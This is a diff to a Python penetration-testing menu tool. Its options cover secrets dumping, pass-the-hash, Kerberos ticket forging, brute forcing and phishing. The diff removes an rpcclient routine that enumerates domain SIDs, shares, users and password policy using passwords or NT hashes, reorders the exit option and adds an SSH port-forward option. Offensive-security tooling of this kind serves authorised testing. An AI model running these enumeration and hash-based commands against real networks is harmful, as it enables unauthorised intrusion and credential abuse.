@@ -771,8 +771,8 @@ def options():
    print('\u2551' + "(06) Re/Set USER   NAME (26)                  (36) PS  Exec (46) Rpc ClientServ (56) PASSWORD2HASH (66) SecretsDump (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) EnumVirtHOST (505)                (   )                (   )           (   )                       " + '\u2551')
    print('\u2551' + "(07) Re/Set PASS   WORD (27)                  (37) SMB Exec (47) Smb ClientServ (57) Pass the HASH (67) CrackMapExe (77) SNMP Walker (87) Hail! HYDRA (97 ) MySQL    (237)                 (347) Edit  Kerb5.conf (447) FUZZ Sub-DOM (506)                (   )                (   )           (   )                       " + '\u2551')
    print('\u2551' + "(08) Re/Set NTLM   HASH (28) Re/Set Community (38) WMO Exec (48) Smb Map SHARES (58) OverPass HASH (68) PSExec HASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238)                 (348)                  (448)              (507)                (   )                (   )           (   )                       " + '\u2551')
-   print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59) Kerbe5 Ticket (69) SmbExecHASH (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239)                 (349)                  (449)              (508)                (   )                (   )           (999) Exit the Application  " + '\u2551')
-   print('\u2551' + "(10) Re/Set DOMAIN NAME (30) Re/Set WORD LIST (40) NFSMount (50) Smb MountSHARE (60) Silver Ticket (70) WmiExecHASH (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240)                 (350)                  (450)              (509)                (   )                (   )           (000)", end= ' ')
+   print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59) Kerbe5 Ticket (69) SmbExecHASH (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239)                 (349)                  (449)              (508)                (   )                (   )           (998) SSH Port Forward      " + '\u2551')
+   print('\u2551' + "(10) Re/Set DOMAIN NAME (30) Re/Set WORD LIST (40) NFSMount (50) Smb MountSHARE (60) Silver Ticket (70) WmiExecHASH (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240)                 (350)                  (450)              (509)                (   )                (   )           (999)", end= ' ')
    if proxyChains == 1:
       print(colored(menuName,colour0, attrs=['blink']), end= ' ' + '\u2551')
    else:
@@ -1118,136 +1118,28 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='0':
-      PTS = getPorts(PTS)
-      POR = spacePadding(PTS, COL1)      
-      squidCheck()
-      SKEW = timeSync(SKEW)      
-      print(colored("[*] Attempting to connect to rpcclient...", colour3))                                             
-      if NTM[:5] != "EMPTY": 
-         print("[i] Using HASH value as password credential for rpcclient...")
-         remoteCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")
-      else:
-         remoteCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")     
-      errorCheck = linecache.getline("lsaquery.tmp", 1)                              
-      if (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
-         print("[-] Unable to connect to RPC data...")
-         checkParam = 1
-      else:
-         print("[+] Connection successful...")               
-      if checkParam != 1:
-         print(colored("[*] Attempting to enumerate domain name...", colour3))               
-         try:
-            null,DOM = errorCheck.split(":")
-            SID = " "*COL1
-         except ValueError:
-            DOM = "EMPTY" 
-         DOM = DOM.lstrip(" ")
-         DOM = spacePadding(DOM, COL1)                  
-         if DOM[:5] == "EMPTY":
-            print("[+] Unable to enumerate domain name...")
-         else:
-            print("[+] Found domain name...\n")
-            print(colored(DOM,colour6))                      
- 
-         if DOMC == 1:
-            print("\n[*] Resetting current domain associated host...")
-            localCOM("sed -i '$d' /etc/hosts")
-            localCOM("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
-            print("[+] Domain " + DOM.rstrip(" ") + " has successfully been added to /etc/hosts...")
-         else:
-            localCOM("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
-            print("\n[+] Domain " + DOM.rstrip(" ") + " successfully added to /etc/hosts...")
-            DOMC = 1                                
-         print(colored("[*] Attempting to enumerate domain SID...", colour3))                        
-         line2 = linecache.getline("lsaquery.tmp", 2)
-         try:
-            null,SID = line2.split(":") 
-         except ValueError:
-            SID = "EMPTY"        
-         SID = SID.lstrip(" ")          
-         SID = spacePadding(SID, COL1)                    
-         if SID[:5] == "EMPTY":
-            print("[+] Unable to enumerate domain SID...")
-         else:
-            print("[+] Found SID...\n")
-            print(colored(SID,colour6) + "\n")                
-         print(colored("[*] Attempting to enumerate shares...", colour3))                  
-         if NTM[:5] != "EMPTY":
-            print("[i] Using HASH value as password credential...")
-            remoteCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")
-         else:
-            remoteCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")               
-         errorCheck = linecache.getline("shares.tmp", 1)   
-         if (errorCheck[:9] == "Could not") or (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
-            print("[-] Access to RPC data restricted...")
-         else:
-            for x in range(0, maxUser):
-               SHAR[x] = " "*COL2
-            localCOM("sed -i -n '/netname: /p' shares.tmp")
-            localCOM("sed -i '/^$/d' shares.tmp")
-            localCOM("cat shares.tmp | sort > sshares.tmp")            
-            count = lineCount("sshares.tmp")                           
-            if count > 0:
-               print("[+] Found shares...\n")
-               with open("sshares.tmp") as read:
-                  for x in range(0, count):
-                     SHAR[x]  = read.readline()
-                     SHAR[x] = SHAR[x].replace(" ","")
-                     try:
-                        null, SHAR[x] = SHAR[x].split(":")
-                     except ValueError:
-                        SHAR[x] = "Error..."
-                     print(colored(SHAR[x].rstrip("\n"),colour6))
-                     SHAR[x] = dotPadding(SHAR[x], COL2)
-                  print("")                  
-         print(colored("[*] Attempting to enumerate domain users...", colour3))
-         if NTM[:5] != "EMPTY":
-            print("[i] Using HASH value as password credential...")
-            remoteCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")
-         else:
-            remoteCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")               
-         errorCheck = linecache.getline("domusers.tmp", 1)
-         if (errorCheck[:9] == "Could not") or (errorCheck[:6] == "result") or (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
-            print("[-] Access to RPC data restricted...")
-         else:               
-            localCOM("rm " + dataDir + "/usernames.txt")
-            localCOM("rm " + dataDir + "/hashes.txt")                   
-            localCOM("sort domusers.tmp > sdomusers.tmp")
-            localCOM("sed -i '/^$/d' sdomusers.tmp")            
-            count2 = lineCount("sdomusers.tmp")             
-            if count2 > 0:
-                print ("[+] Found users...\n")
-                with open("sdomusers.tmp", "r") as read, open(dataDir + "/usernames.txt", "a") as write1, open(dataDir + "/hashes.txt", "a") as write2:
-                   for x in range(0, count2):
-                      line = read.readline()
-                      if "user:[Guest]" in line:
-                         null,rid = line.split("rid:")
-                         rid = rid.replace("[","")
-                         rid = rid.replace("]","")
-                      try:
-                         null1,USER[x],null2 = line.split(":")
-                      except ValueError:
-                         USER[x] = "Error..."                           
-                      USER[x] = USER[x].replace("[","")
-                      USER[x] = USER[x].replace("]","")
-                      USER[x] = USER[x].replace("rid","")                     
-                      if USER[x][:5] != "Error":
-                         USER[x] = spacePadding(USER[x], COL3)
-                         HASH[x] = spacePadding("", COL4)
-                         if USER[x][:1] != " ":
-                            write1.write(USER[x].rstrip(" ") + "\n")
-                            write2.write(HASH[x].rstrip(" ") + "\n")                                                         
-                            print(colored(USER[x],colour6))
-            else:
-               print("[+] Unable to enumerate domain users...")            
-            print(colored("\n[*] Attempting to enumerate Guest password policy...", colour3))
-            remoteCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'getusrdompwinfo " + rid + "' > policy.tmp")            
-            localCOM("sed -i '/ &info: struct samr_PwInfo/d' policy.tmp 2>&1")  
-            localCOM("sed -i '/^s*$/d' policy.tmp 2>&1")
-            catsFile("policy.tmp")
-      prompt()
-      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Save running config to config.txt and exit program
+# Modified: N/A
+# Note    : Need to update the database file
+# -------------------------------------------------------------------------------------
+
+   if selection == '0':        
+      saveParams()
+      localCOM("rm *.tmp")      
+      if DOMC == 1:
+         print("[+] Removing domain name from /etc/hosts...")
+         localCOM("sed -i '$d' /etc/hosts")         
+      if DNSC == 1:
+         print("[+] Removing dns server from /etc/resolv.conf...")
+         localCOM("sed -i '$d' /etc/resolv.conf")         
+      connection.close()
+      print(colored("[*] Program sucessfully terminated...", colour3))
+      exit(1)  
+            
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -4323,28 +4215,25 @@ while True:
    if selection == '602':
       print(colored("[*] Scanning webpage...", colour3))   
       remoteCOM("nuclei -target " + WEB.rstrip("") + " --tags LFI")
-      prompt()     
-
+      prompt()          
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Save running config to config.txt and exit program
+# Details : Menu option selected - SSH Port Forward
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '999':        
-      saveParams()
-      localCOM("rm *.tmp")      
-      if DOMC == 1:
-         print("[+] Removing domain name from /etc/hosts...")
-         localCOM("sed -i '$d' /etc/hosts")         
-      if DNSC == 1:
-         print("[+] Removing dns server from /etc/resolv.conf...")
-         localCOM("sed -i '$d' /etc/resolv.conf")         
-      connection.close()
-      print(colored("[*] Program sucessfully terminated...", colour3))
-      exit(1)       
+   if selection == '998':
+      print(colored("[*] Activating SSH Port Forwarding Service...", colour3))   
+      TPORT = input("[?] Please select the target port value: ")
+      if TPORT.isnumeric():
+         remoteCOM("ssh -L 7777:" + TIP.rstrip(" ") + ":" + TPORT + " " + USR.rstrip(" ") + "@" + DOM.rstrip(" "))
+         localCOM("firefox localhost:7777")
+         prompt()
+      else:
+         pass  
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -4354,7 +4243,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='000':        
+   if selection =='999':        
       if proxyChains == 0:
          proxyChains = 1
          print("[+] Proxychains activated...")
